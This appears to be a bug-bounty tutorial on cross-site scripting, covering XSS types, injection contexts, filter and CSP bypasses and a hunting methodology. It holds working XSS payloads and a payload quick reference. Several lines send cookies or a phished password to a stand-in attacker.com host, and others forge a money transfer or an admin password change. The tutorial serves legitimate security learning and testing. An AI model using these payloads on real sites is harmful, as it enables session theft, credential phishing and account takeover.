# Core XSS Concepts - Fundamentals and Attack Vectors

## What is XSS?

Cross-Site Scripting (XSS) occurs when **untrusted user input is rendered in a browser context that allows code execution**.

### The Formula

```
User Input → Server Processing → Browser Rendering → JavaScript Execution

If any stage fails to sanitize/validate:
  → User can inject JavaScript
  → User code executes in victim's browser
  → Full compromise possible
```

---

## XSS Types - The Three Categories

### Type 1: Reflected XSS

**Definition:** User input is reflected immediately in the response without sanitization.

```
User sends: GET /search?q=<img src=1 onerror=alert(1)>
  ↓
Server reflects: <p>Search results for: <img src=1 onerror=alert(1)></p>
  ↓
Browser renders: img tag loads, onerror fires, alert executes
```

**Characteristics:**
- ✅ Not stored (single request/response)
- ✅ Requires victim to click attacker's link
- ✅ Easier to find (obvious reflection)
- ✅ Medium bounty ($3K-15K)
- ❌ Requires social engineering
- ❌ Not persistent

**Common locations:**
- Search queries
- Error messages
- Success messages
- Parameter values
- Breadcrumbs
- Sorting/filtering

---

### Type 2: Stored XSS

**Definition:** User input is stored in database and reflected to other users later.

```
Attacker submits: Comment with <script>steal_session()</script>
  ↓
Server stores: Saves comment to database
  ↓
Other users view: Comment renders in page
  ↓
Browser executes: script tag runs for every viewer
  ↓
Impact: Every user's session stolen (CRITICAL)
```

**Characteristics:**
- ✅ Persistent (stored in database)
- ✅ No user interaction needed (automatic)
- ✅ Affects multiple users
- ✅ Can spread like worm
- ✅ Highest bounty ($50K+)
- ❌ Harder to find (requires submission + viewing)

**Common locations:**
- Comments/messages
- User profiles
- Support tickets
- Product reviews
- User-generated content
- Forum posts

---

### Type 3: DOM-Based XSS

**Definition:** Vulnerability exists in client-side JavaScript, not server output.

```
JavaScript Code:
  document.getElementById('content').innerHTML = location.hash.substring(1);

User sends: http://site.com#<img src=1 onerror=alert(1)>
  ↓
JavaScript receives: location.hash = "<img src=1 onerror=alert(1)>"
  ↓
innerHTML processes: HTML parsed, img tag executes
  ↓
Browser renders: onerror fires, alert executes
```

**Characteristics:**
- ✅ No server reflection (pure client-side)
- ✅ Often in modern SPAs/frameworks
- ✅ Can be bypassed by CSP
- ✅ High bounty ($15K-30K)
- ❌ Requires JavaScript understanding
- ❌ More complex to identify

**Common locations:**
- location.hash processing
- location.search processing
- localStorage/sessionStorage
- postMessage handling
- Framework templating

---

## XSS Execution Contexts - Why Context Matters

The **context** where user input appears determines what payload works:

### Context 1: HTML Context

**Input appears between HTML tags:**

```html
<p>USER_INPUT</p>
```

**Payload that works:**

```html
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<script>alert(1)</script>
```

**Why:** Browser interprets new tags as HTML, executes event handlers.

---

### Context 2: Attribute Context

**Input appears inside HTML attribute:**

```html
<input value="USER_INPUT">
<img src="USER_INPUT">
<a href="USER_INPUT">link</a>
```

**Payload that works:**

```html
" onfocus=alert(1) autofocus x="
' onfocus=alert(1) autofocus x='
" onerror=alert(1) x="
```

**Why:** Close the attribute, add event handler, create new attribute.

---

### Context 3: JavaScript String Context

**Input appears inside JavaScript string:**

```html
<script>
  var searchQuery = 'USER_INPUT';
  console.log(searchQuery);
</script>
```

**Payload that works:**

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
```

**Why:** Break out of string, execute statement, comment out rest.

---

### Context 4: JavaScript Template Literal

**Input appears in template literal:**

```html
<script>
  const message = `User searched for: USER_INPUT`;
</script>
```

**Payload that works:**

```javascript
${alert(1)}
${fetch('attacker.com?c='+document.cookie)}
```

**Why:** Template literals evaluate ${} expressions.

---

### Context 5: URL/Protocol Context

**Input appears in URL or protocol:**

```html
<a href="USER_INPUT">click</a>
```

**Payload that works:**

```
javascript:alert(1)
data:text/html,<img src=1 onerror=alert(1)>
```

**Why:** Browser can execute javascript: protocol.

---

### Context 6: CSS Context

**Input appears in CSS:**

```html
<style>
  .userClass {
    background: url('USER_INPUT');
  }
</style>
```

**Payload that works:**

```css
'url(javascript:alert(1))'
```

**Why:** CSS allows javascript: in some contexts.

---

## Event Handlers - The Execution Triggers

Even if you inject HTML, it must be triggered. These event handlers execute JavaScript:

```
onclick              - User clicks element
onfocus              - Element gains focus
onmouseover          - Mouse moves over element
onerror              - Resource fails to load
onload               - Element finishes loading
ontoggle             - Toggle state changes
onbeforeinput        - Before input is entered
ontransitionend      - CSS transition finishes
onanimationstart     - CSS animation starts
onchange             - Input value changes
ondblclick           - Double click
onwheel              - Mouse wheel scrolls
onpointerover        - Pointer over element
oncontextmenu        - Right click
oninput              - User inputs value
onkeydown/up         - Keyboard key press
```

**Key insight:** Some require user interaction (onclick), others don't (onerror, onload).

---

## Filter Bypass - Common Characters Blocked

**Common blocks:**

```
< > " ' / script alert eval
```

**Bypass techniques:**

```
Encoding:
  < as &lt; or %3C or &#60;
  > as &gt; or %3E or &#62;

Case variation:
  <ScRiPt> instead of <script>
  <SCRIPT> instead of <script>

Obfuscation:
  alert(1) as window['alert'](1)
  script as eval(atob('c2NyaXB0'))

Alternative vectors:
  <svg> instead of <script>
  <img> instead of <script>
  <iframe> instead of <script>
  Event handlers instead of tags
```

---

## CSP - Content Security Policy (The Defense)

CSP is a security header that restricts what resources can load and execute:

```
Content-Security-Policy: script-src 'self' cdn.example.com
```

**This policy means:**
- ✅ Scripts from same origin allowed
- ✅ Scripts from cdn.example.com allowed
- ❌ Inline <script> blocked
- ❌ External scripts not in whitelist blocked
- ❌ eval() blocked
- ❌ javascript: URLs blocked

**How to bypass:**

```
1. Script injection if 'unsafe-inline' set
2. eval() if 'unsafe-eval' set
3. Whitelisted CDN gadget attack
4. Nonce/hash in response (rare bypass)
5. CSP header injection (if injectable)
6. Report-uri exfiltration (no execution, but data leak)
```

---

## Key Differences: Reflected vs Stored vs DOM

| Feature | Reflected | Stored | DOM |
|---------|-----------|--------|-----|
| Storage | No | Yes (database) | No (client-side) |
| Persistence | No | Yes | No |
| Server reflects | Yes | No | No |
| Client-side | Possible | No | Yes |
| User interaction | Required (usually) | Not required | Possible |
| Bounty | $3K-15K | $50K+ | $15K-30K |
| Difficulty | Easy | Medium | Hard |
| Scope | Single user | All users | Single user (usually) |

---

## Why XSS is High Bounty

### Session/Cookie Theft

```javascript
fetch('attacker.com/steal?c=' + document.cookie)
```

Attacker gets session → Can impersonate user → Account takeover

### Credential Harvesting

```javascript
var password = prompt('Session expired. Enter password:');
fetch('attacker.com/creds?p=' + password)
```

Users enter credentials → Attacker logs in as them → Account takeover

### CSRF Bypass

```javascript
fetch('/api/transfer-money', {
  method: 'POST',
  body: JSON.stringify({from: userId, to: attackerId, amount: 10000})
})
```

Execute action as logged-in user → Transfer money, change email, etc.

### Privilege Escalation

```javascript
// If admin is viewing page with stored XSS
// Attacker can make them change admin password
fetch('/api/admin/change-password', {
  method: 'POST',
  body: JSON.stringify({newPassword: 'attacker123'})
})
```

Admin unknowingly executes attacker's code → Account compromised

---

## The XSS Hunting Methodology

```
STEP 1: Map Input Points
  - Find ALL user-controlled inputs
  - GET parameters
  - POST parameters
  - Headers
  - Cookies
  - File uploads
  - Anything user controls

STEP 2: Map Output Points
  - Find WHERE user input is reflected
  - HTML body
  - HTML attributes
  - JavaScript strings
  - URLs
  - CSS
  - Response headers

STEP 3: Identify Context
  - HTML? Attribute? JavaScript? URL?
  - Different context = different payload

STEP 4: Test Payloads
  - Try basic payload for context
  - Observe how filter blocks
  - Modify payload to bypass

STEP 5: Verify Execution
  - JavaScript actually runs?
  - Not just DOM update?
  - Browser console shows execution?

STEP 6: Assess Impact
  - Can steal session?
  - Can perform actions?
  - Can affect other users?
  - How many users affected?

STEP 7: Report
  - Reproduce steps
  - Prove impact
  - Suggest fix
```

---

## Quick Payload Reference

```
HTML:        <img src=1 onerror=alert(1)>
Attribute:   " onfocus=alert(1) autofocus x="
JavaScript:  ';alert(1);//
Template:    ${alert(1)}
URL:         javascript:alert(1)
SVG:         <svg onload=alert(1)>
Event:       onmouseover=alert(1)
```

Each context requires understanding **how** the browser interprets it.

